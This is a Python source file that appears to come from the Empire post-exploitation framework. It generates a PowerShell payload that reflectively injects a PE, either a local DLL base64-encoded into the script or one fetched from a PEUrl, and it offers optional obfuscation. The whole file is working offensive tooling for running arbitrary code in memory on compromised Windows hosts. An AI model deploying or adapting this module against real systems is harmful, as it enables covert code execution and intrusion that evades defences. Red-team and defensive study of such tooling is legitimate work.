from __future__ import print_function

import base64
from builtins import object, str
from typing import Dict

from empire.server.common import helpers
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        script_end = "\nInvoke-ReflectivePEInjection"

        # check if file or PEUrl is set. Both are required params in their respective parameter sets.
        if params["File"] == "" and params["PEUrl"] == "":
            return handle_error_message("[!] Please provide a PEUrl or File")
        for option, values in params.items():
            if option.lower() != "agent":
                if option.lower() == "file":
                    if values != "":
                        try:
                            f = open(values, "rb")
                            dllbytes = f.read()
                            f.close()

                            base64bytes = base64.b64encode(dllbytes).decode("UTF-8")

                            script_end = (
                                "\n$PE =  [Convert]::FromBase64String('"
                                + base64bytes
                                + "')"
                                + script_end
                            )
                            script_end += " -PEBytes $PE"

                        except Exception:
                            print(
                                helpers.color(
                                    "[!] Error in reading/encoding dll: " + str(values)
                                )
                            )
                elif option.lower() == "forceaslr":
                    if values.lower() == "true":
                        script_end += " -" + str(option)
                elif values.lower() == "true":
                    script_end += " -" + str(option)
                elif values and values != "":
                    script_end += " -" + str(option) + " " + str(values)

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
